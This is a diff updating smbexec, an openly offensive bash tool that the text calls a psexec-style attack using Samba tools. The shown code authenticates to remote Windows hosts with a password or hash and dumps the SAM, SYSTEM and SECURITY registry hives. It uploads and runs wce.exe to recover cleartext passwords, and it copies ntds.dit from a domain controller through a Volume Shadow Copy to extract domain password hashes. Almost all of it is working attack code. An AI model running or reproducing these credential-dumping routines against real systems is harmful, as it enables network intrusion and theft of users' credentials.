@@ -22,7 +22,7 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.e
 #
-# Last update - 01/16/2013 v1.2.2
+# Last update - 01/19/2013 v1.2.2.1
 #############################################################################################
 
 # Check to see if X is running
@@ -292,7 +292,7 @@ f_vanish(){
 f_banner(){
 	clear
 	echo "************************************************************"
-	echo -e "		      \e[1;36msmbexec - v1.2.2\e[0m       "
+	echo -e "		      \e[1;36msmbexec - v1.2.2.1\e[0m       "
 	echo "	A rapid psexec style attack with samba tools              "
 	echo "      Original Concept and Script by Brav0Hax & Purehate    "
 	echo "              Codename - Mommy's Little Monster	          "
@@ -493,9 +493,11 @@ for i in $(cat $RHOSTS); do
 		mkdir $logfldr/hashes/$i
 		# Get the registry keys
 		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %WINDIR%\Temp\sam && reg.exe save HKLM\SYSTEM %WINDIR%\Temp\sys && reg.exe save HKLM\SECURITY %WINDIR%\Temp\sec" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\%WINDIR%\\Temp\\sam $logfldr/hashes/$i/sam" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\%WINDIR%\\Temp\\sec $logfldr/hashes/$i/sec" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\%WINDIR%\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
+		$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %WINDIR%" &> /tmp/smbexec/windir.info
+		windir=$(cat /tmp/smbexec/windir.info| cut -d "\\" -f2|tr -d '\r')
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get $windir\\Temp\\sam $logfldr/hashes/$i/sam" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get $windir\\Temp\\sec $logfldr/hashes/$i/sec" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get $windir\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
 	
 		#Get the hashes out of the reg keys
 		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sys ]; then
@@ -512,12 +514,12 @@ for i in $(cat $RHOSTS); do
 		
 		#Get the clear text passwords with protected wce
 		if [ $wce == 1 ]; then
-			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "put $smbexecpath/wce.exe \\%WINDIR%\\Temp\\wce.exe" &> /dev/null
-			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C \\%WINDIR%\\Temp\\wce.exe -w" &> /tmp/smbexec/wce.tmp
+			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "put $smbexecpath/wce.exe $windir\\Temp\\wce.exe" &> /dev/null
+			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C %WINDIR%\\Temp\\wce.exe -w" &> /tmp/smbexec/wce.tmp
 			#Put the passwords in a text file in the logfolder
 			cat /tmp/smbexec/wce.tmp|grep ":" > $logfldr/hashes/$i/cleartext.pwds
 			#cleanup the host including wce.exe
-			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys && DEL %WINDIR%\Temp\wce.exe" &> /dev/null
+			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys && DEL %WINDIR%\Temp\wce.exe" #&> /dev/null
 		else
 			#cleanup the host minus wce.exe
 			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys" &> /dev/null
@@ -639,7 +641,7 @@ f_createvss(){
 for i in $(cat $RHOSTS); do
 	mkdir $logfldr/hashes/DC
 	# Create a Volume Shadow Copy
-	echo -e "\n\e[1;33mAttempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
+	echo -e "\n\e[1;33m[*]Attempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
 	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin create shadow /for=$ntdsdrive" &> /tmp/smbexec/vssdc.out
 	vscpath=$(cat /tmp/smbexec/vssdc.out | grep "Volume Name"|cut -d " " -f9)
 	vscid=\{$(cat /tmp/smbexec/vssdc.out |grep "Shadow Copy ID"|cut -d "{" -f2|cut -d "}" -f1)\}
@@ -654,7 +656,7 @@ for i in $(cat $RHOSTS); do
 		sleep 2
 	fi
 	
-	echo -e "\n\e[1;33mAttempting to copy the ntds.dit file from the Volume Shadow Copy...\e[0m"
+	echo -e "\n\e[1;33m[*]Attempting to copy the ntds.dit file from the Volume Shadow Copy...\e[0m"
 	sleep 2
 	sharedrive="$(echo $tempdrive| cut -d":" -f1)$"
 	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C copy $vscpath\\$ntdspath\\ntds.dit $tempdrive$temppath\\ntds.dit && reg.exe save HKLM\SYSTEM $tempdrive$temppath\\sys" &> /dev/null
@@ -671,9 +673,9 @@ for i in $(cat $RHOSTS); do
 		sleep 3
 	fi
 	#cleanup the host
-	echo -e "\n\e[1;33mAttempting to remove the files created from the Domain Controller...\e[0m"
+	echo -e "\n\e[1;33m[*]Attempting to remove the files created from the Domain Controller...\e[0m"
 	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
-	echo -e "\n\e[1;33mAttempting to remove the shadow copy created from the Domain Controller...\e[0m"
+	echo -e "\n\e[1;33m[*]Attempting to remove the shadow copy created from the Domain Controller...\e[0m"
 	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin Delete Shadows /Shadow=$vscid /quiet" &> /dev/null
 done
 
@@ -685,30 +687,31 @@ f_mainmenu
 }
 
 f_finddcs(){
-x="com net org"
-echo > /tmp/smbexec/pdc.txt
-echo > /tmp/smbexec/dcs.txt
+if [ "$SMBDomain" != "." ]; then
+	x="com net org local"
+	echo > /tmp/smbexec/pdc.txt
+	echo > /tmp/smbexec/dcs.txt
 
-for i in $x; do
-	dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
-	dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
-done
+	for i in $x; do
+		dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
+		dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
+	done
 
-if [ -s /tmp/smbexec/pdc.txt ]; then
-	echo -e "\nPrimary Domain Controller\n========================="
-	cat /tmp/smbexec/pdc.txt
+	if [ -s /tmp/smbexec/pdc.txt ]; then
+		echo -e "\nPrimary Domain Controller\n========================="
+		cat /tmp/smbexec/pdc.txt
+	fi
+
+	if [ -s /tmp/smbexec/dcs.txt ]; then
+		echo -e "\nAll Domain Controllers\n======================"
+		cat /tmp/smbexec/dcs.txt
+		echo
+	fi
 fi
-
-if [ -s /tmp/smbexec/dcs.txt ]; then
-	echo -e "\nAll Domain Controllers\n======================"
-	cat /tmp/smbexec/dcs.txt
-	echo
-fi
-
 }
 
 f_esedbexport(){
-echo -e "\n\e[1;33mExtracting data and link tables from the ntds.dit file...\e[0m"
+echo -e "\n\e[1;33m[*]Extracting data and link tables from the ntds.dit file...\e[0m"
 sleep 2
 eseexportpath=$(locate -l 1 -b "\esedbexport"| sed 's,/*[^/]\+/*$,,')
 $eseexportpath/esedbexport -l /tmp/smbexec/esedbexport.log -t /tmp/smbexec/ntds.dit $logfldr/hashes/DC/ntds.dit
@@ -717,10 +720,10 @@ linktable=$(ls /tmp/smbexec/ntds.dit.export/ | grep link_table)
 }
 
 f_dsusers(){
-echo -e "\n\e[1;33mExtracting hashes, please standby...\e[0m"
+echo -e "\n\e[1;33m[*]Extracting hashes, please standby...\e[0m"
 sleep 2
 dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
-python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys --certificates --suplcreds $logfldr/hashes/DC/sys --membership > $logfldr/hashes/DC/ntds.output
+python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys > $logfldr/hashes/DC/ntds.output
 $smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/dc-hashes.lst
 
 if [ -s $logfldr/hashes/DC/dc-hashes.lst ]; then
@@ -839,9 +842,9 @@ f_enumshares(){
 
 f_smbauth(){
 	SMBUser= #Since the prog is a loop make sure we clear this out
-	while [ -z $SMBUser ]; do read -r -p " Please provide the username to authenticate as : " SMBUser; done
+	while [ -z $SMBUser ]; do read -r -e -p " Please provide the username to authenticate as : " SMBUser; done
 	SMBPass= #Since the prog is a loop make sure we clear this out
-	while [ -z $SMBPass ]; do read -p " Please provide the password or hash (<LM>:<NTLM>) for the specified username : " SMBPass; done
+	while [ -z $SMBPass ]; do read -e -p " Please provide the password or hash (<LM>:<NTLM>) for the specified username : " SMBPass; done
 
 	# Hashes are 65 characters long, this compares input to see if its a password or a hash
 	SMBHASH= #Since the prog is a loop make sure we clear this out
@@ -855,13 +858,13 @@ f_smbauth(){
 			SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
 			SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
 		else
-			while [ -z $SMBDomain ]; do read -p " Please provide the Domain for the user account specified : " SMBDomain; done
+			while [ -z $SMBDomain ]; do read -e -p " Please provide the Domain for the user account specified : " SMBDomain; done
 		fi
 	elif [ "$mainchoice" == "4" ]; then # Check for domain for host share list option
-		read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
+		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
 	elif [ "$mainchoice" == "8" ]; then # Check for domain for host share list option
-		read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
+		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
 	else
 		SMBDomain=. #equivalent to localhost, thx Mubix!
